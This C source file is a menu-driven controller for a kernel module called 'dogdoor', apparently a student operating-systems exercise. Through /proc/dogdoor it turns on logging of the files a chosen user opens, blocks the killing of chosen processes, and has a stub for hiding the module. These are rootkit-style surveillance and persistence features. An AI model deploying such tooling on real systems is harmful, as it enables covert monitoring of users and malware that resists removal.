#include<stdio.h>
#include<stdlib.h>
#include<string.h>
#include <pwd.h>

struct passwd *pw;
int visl=0,visb=0;

void getlog(){
	int ch=0;
	if(visl){
		printf("\n1. See log result.\n2.Change current tracking user name.\n->");
		scanf("%d",&ch);
		switch(ch){
			case 1: showlog(); break;
			case 2: inslog(); break;
			default: printf("Ilncorrect input"); break;
		}
	}
	else{
		visl=1; 
		inslog();
	}					
}
void showlog(){
	system("cat /proc/dogdoor");
}
void inslog(){
	int uid;	
	char txt[100];
	char command[100];
	printf("Enter name of user that you want to get file log.\n->");
	scanf("%s",&txt);
	printf("\n%s\n",txt);
	pw=getpwnam(txt);
	uid=pw->pw_uid;
	sprintf(command, "echo '1 block %d' > /proc/dogdoor",uid);
	system(command);
}
void nokill(){
	int ch=0;
	if(visb){
		printf("1. Free a procces.\n2.Block process\n->");
		scanf("%d",&ch);
		switch(ch){
			case 1: freep(); break;
			case 2: blockp(); break;
			default: printf("Incorrect input"); break;
		}
	}
	else{
		visb=1; 
		blockp();
	}	
}
void blockp(){
	int pid;
	char command[100];
	printf("Enter process ID that you want prevent a kill.\n");
	scanf("%d",&pid);
	sprintf(command, "echo '2 block %d' > /proc/dogdoor",pid);
	system(command);
	printf("Kill prevent requested! \n");
}
void freep(){
	int pid;
	char command[100];
	printf("Enter process ID that you want allow a kill.\n->");
	scanf("%d",&pid);
	sprintf(command, "echo '2 free %d' > /proc/dogdoor",pid);
	system(command);
	printf("Kill allow requested! \n");
}

void toggleh(){
	system("clear");
	printf("\nToggle hide orow");
}

int main(int argc, char **argv){
	int chose,stop=1;	
	while(stop){
		printf("\n********************************************************************************\nThis is bingo communication program to dogdoor.Choose from following operations:\n\n1. Get log of the names of file that user has recently accesed\n2. Prevent a kill to a specified process \n3. Toggle hide dogdoor \n4. Exit\n->");	
		scanf("%d",&chose);
		switch(chose){
			case 1: getlog();break;	
			case 2: nokill(); break;
			case 3: toggleh(); break;
			case 4: stop=0; break;
			default: printf("\nIncorrect input!"); break;
		}
	}
	return 0;
}
